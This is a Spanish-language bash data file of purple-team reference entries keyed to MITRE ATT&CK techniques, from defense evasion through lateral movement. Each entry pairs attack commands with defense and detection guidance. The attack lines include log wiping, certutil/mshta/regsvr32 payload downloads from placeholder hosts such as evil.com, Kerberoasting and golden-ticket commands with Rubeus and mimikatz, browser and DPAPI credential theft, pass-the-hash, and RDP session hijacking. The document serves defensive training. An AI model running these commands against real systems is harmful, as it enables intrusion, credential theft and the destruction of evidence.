#!/bin/bash
# Extensión de mitre_data.sh - Parte 2

# TA0005 - Defense Evasion
PURPLE_DATA["T1070"]="
📝 DESCRIPCIÓN: Borrado de registros y evidencias para ocultar actividad (Log wipe).
|||
🔴 ATAQUE — Indicator Removal:
  • wevtutil cl Security (en TARGET)
  • Clear-EventLog -LogName Security,System (PowerShell en TARGET)
  • rm -rf ~/.bash_history && history -c (Linux TARGET)
|||
🔵 DEFENSA:
  • Enviar logs en tiempo real a un SIEM (centralización).
  • Configurar repositorios inmutables WORM.
|||
🟣 DETECCIÓN:
  • Event ID 1102: El registro de auditoría fue borrado.
  • Alerta en SIEM si un endpoint deja de enviar eventos de golpe."

PURPLE_DATA["T1218"]="
📝 DESCRIPCIÓN: Uso de binarios legítimos de Windows (LoLBins) para evadir AV/EDR.
|||
🔴 ATAQUE — System Binary Proxy Execution:
  • certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe (descargar en TARGET)
  • mshta.exe http://attacker.com/payload.hta (ejecutar en TARGET)
  • regsvr32.exe /s /n /u /i:http://evil.com/x.sct scrobj.dll
|||
🔵 DEFENSA:
  • Hardening con WDAC o AppLocker bloqueando la ejecución desde /Temp.
  • Bloquear procesos firmados si intentan conexiones de red no estándar.
|||
🟣 DETECCIÓN:
  • Sysmon Event ID 1: Certutil o mshta con argumentos HTTP.
  • Sysmon Event ID 3: HTA conectando a IPs públicas."

# TA0006 - Credential Access
PURPLE_DATA["T1558"]="
📝 DESCRIPCIÓN: Robo o falsificación de Tickets Kerberos (Kerberoasting, Pass the Ticket).
|||
🔴 ATAQUE — Steal or Forge Kerberos Tickets:
  • GetUserSPNs.py user:pass@TARGET -request (Kerberoasting)
  • Rubeus.exe kerberoast /outfile:hashes.txt
  • mimikatz.exe kerberos::golden /user:admin /krbtgt:hash /ptt
|||
🔵 DEFENSA:
  • Cuentas de servicio (SPN) con contraseñas de +25 caracteres alfanuméricos.
  • Deshabilitar RC4 (0x17) y forzar AES-256 (0x12).
|||
🟣 DETECCIÓN:
  • Event ID 4769: Solicitud de Ticket Granting Service masivas (Kerberoasting).
  • Monitorizar Ticket Encryption Type: 0x17 es altamente sospechoso."

PURPLE_DATA["T1555"]="
📝 DESCRIPCIÓN: Extracción de credenciales desde almacenes locales (Browsers, DPAPI, KeePass).
|||
🔴 ATAQUE — Credentials from Password Stores:
  • LaZagne.exe all (en TARGET)
  • copy \"C:\\Users\\Bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"
  • python3 dpapi.py masterkey /in:key /password:pass
|||
🔵 DEFENSA:
  • Forzar Master Passwords en gestores.
  • No guardar contraseñas críticas en navegadores corporativos.
|||
🟣 DETECCIÓN:
  • Herramientas de File Integrity Monitor alertando lecturas de \"Login Data\".
  • Ejecución de binarios forenses como LaZagne o SharpDPAPI conocidos."

PURPLE_DATA["T1056"]="
📝 DESCRIPCIÓN: Captura de inputs del usuario (Keylogging, Web Injects).
|||
🔴 ATAQUE — Input Capture:
  • Inyección de GetAsyncKeyState() vía DLL en un proceso del TARGET.
  • zeus/carbanak hookeando APIs del browser.
|||
🔵 DEFENSA:
  • Software Anti-Keylogger y navegación segura aislada.
|||
🟣 DETECCIÓN:
  • EDR: Hooking continuo sobre SetWindowsHookEx.
  • Creación de logs o archivos txt con latencia de escritura a nivel teclado."

PURPLE_DATA["T1552"]="
📝 DESCRIPCIÓN: Búsqueda de credenciales no seguras en texto claro (Archivos, Bash History).
|||
🔴 ATAQUE — Unsecured Credentials:
  • cat ~/.bash_history | grep -i pass (en TARGET)
  • find / -name \"wp-config.php\"
  • findstr /si password *.txt *.xml *.ini
|||
🔵 DEFENSA:
  • Usar Secrets Managers (HashiCorp, AWS Secrets).
|||
🟣 DETECCIÓN:
  • Uso abusivo de comandos findstr o find grep sobre volúmenes completos.
  • Accesos de lectura inusuales a archivos de configuración de despliegue."

# TA0007 - Discovery
PURPLE_DATA["T1082"]="
📝 DESCRIPCIÓN: Descubrimiento de Información del Sistema.
|||
🔴 ATAQUE — System Information Discovery:
  • systeminfo (en TARGET)
  • Get-ComputerInfo (en TARGET)
  • uname -a && cat /etc/os-release (en TARGET linux)
|||
🔵 DEFENSA:
  • Restricción del runtime PowerShell/cmd a administradores definidos.
|||
🟣 DETECCIÓN:
  • Alertar ejecuciones de systeminfo o uname -a seguidas de otros comandos discovery rápidamente (<1 minuto)."

PURPLE_DATA["T1083"]="
📝 DESCRIPCIÓN: Descubrimiento de Archivos y Directorios.
|||
🔴 ATAQUE — File and Directory Discovery:
  • dir /s /b *.docx (en TARGET)
  • find / -type f -mtime -5 (últimos archivos modificados en TARGET)
|||
🔵 DEFENSA:
  • Principio de mínimo privilegio en NTFS / ext4.
|||
🟣 DETECCIÓN:
  • Alertar sobre crawling recursivo desde el CLI en carpetas de red montadas o perfiles locales ajenos."

PURPLE_DATA["T1057"]="
📝 DESCRIPCIÓN: Enumeración de procesos corriendo para evadir AV o encontrar inyecciones.
|||
🔴 ATAQUE — Process Discovery:
  • tasklist /v (en TARGET)
  • ps aux (en TARGET linux)
  • Get-Process -IncludeUserName
|||
🔵 DEFENSA:
  • Mount del kernel procfs con hidepid en Linux para no ver procesos de otros usuarios.
|||
🟣 DETECCIÓN:
  • Actividad típica pre-exfiltración. Búsqueda de procesos \"AV\" o \"EDR\" vía WMIC o tasklist."

PURPLE_DATA["T1016"]="
📝 DESCRIPCIÓN: Descubrimiento de configuración de Red del Sistema.
|||
🔴 ATAQUE — System Network Configuration:
  • ipconfig /all && arp -a && route print (en TARGET)
  • ifconfig && ip route && netstat -tulnp (en TARGET linux)
|||
🔵 DEFENSA:
  • Zero Trust Network Access (ZTNA) para invisibilizar topología interna.
|||
🟣 DETECCIÓN:
  • Ejecución en cadena de herramientas de red nativas en muy poco tiempo: ipconfig -> arp -> route."

PURPLE_DATA["T1018"]="
📝 DESCRIPCIÓN: Descubrimiento de otros Sistemas Remotos usando el host actual como pivote.
|||
🔴 ATAQUE — Remote System Discovery:
  • net view /all /domain (en TARGET)
  • nmap -sn 192.168.1.0/24 (ping sweep desde TARGET)
  • BloodHound (SharpHound.exe -c All)
|||
🔵 DEFENSA:
  • Deshabilitar NetBIOS y LLMNR.
|||
🟣 DETECCIÓN:
  • Event ID 4661: Peticiones LDAP excesivas.
  • NetFlow: ARP sweeps o ICMP sweeps originados desde un endpoint interno."

# TA0008 - Lateral Movement
PURPLE_DATA["T1550"]="
📝 DESCRIPCIÓN: Movimiento Lateral usando Credenciales robadas, como Pass The Hash (PtH) o Ticket (PtT).
|||
🔴 ATAQUE — Use Alternate Auth Material:
  • pth-winexe -U 'DOMAIN\\admin%aad3b435:HASH' //TARGET cmd.exe
  • Rubeus.exe ptt /ticket:ticket.kirbi (en TARGET hacia un DC)
|||
🔵 DEFENSA:
  • Implementar Windows LAPS para randomizar contraseñas locales (mitiga PtH).
  • Forzar rotación periódica del KRBTGT para invalidar Golden Tickets (PtT).
|||
🟣 DETECCIÓN:
  • Event ID 4624 (Logon Type 9 - NewCredentials).
  • Event ID 4768: TGT con características inusuales o tiempo de vida anómalo."

PURPLE_DATA["T1080"]="
📝 DESCRIPCIÓN: Infección de carpetas compartidas (SMB/DFS) para comprometer otros equipos.
|||
🔴 ATAQUE — Taint Shared Content:
  • Reemplazar un .lnk en la red //TARGET/Compartida/ por uno malicioso.
  • Infectar archivos .exe o inyectar código VBA en .docx alojados allí.
|||
🔵 DEFENSA:
  • NTFS Permissions (ACLs) muy estrictos en File Servers. Solo lectura para grupo General.
|||
🟣 DETECCIÓN:
  • SIEM: Alertar sobre modificación de scripts, .lnk o binarios en recursos compartidos principales."

PURPLE_DATA["T1534"]="
📝 DESCRIPCIÓN: Envío de correos de phishing internos una vez comprometida una cuenta local.
|||
🔴 ATAQUE — Internal Spearphishing:
  • Enviar correo con adjunto malicioso desde juan@empresa.com hacia director@TARGET.com
|||
🔵 DEFENSA:
  • Reglas Anti-Phishing que también filtren el flujo interno-interno de Office 365 / Exchange.
|||
🟣 DETECCIÓN:
  • Envío masivo inusual de correos a listas de distribución internas desde un usuario de bajo nivel."

PURPLE_DATA["T1563"]="
📝 DESCRIPCIÓN: Secuestro de sesiones existentes de SSH/RDP (RDP Hijacking).
|||
🔴 ATAQUE — Remote Session Hijacking:
  • tscon.exe 2 /dest:console (Secuestrar sesión RDP de TARGET como SYSTEM).
  • Robar socket de SSH activo de otro usuario logueado en la misma máquina.
|||
🔵 DEFENSA:
  • Desconectar sesiones RDP inactivas severamente.
  • Limitar el acceso RDP a usuarios simultáneos.
|||
🟣 DETECCIÓN:
  • Event ID 4778: Sesión reconectada. El origen podría no ser el escritorio remoto, sino la propia consola (tscon)."
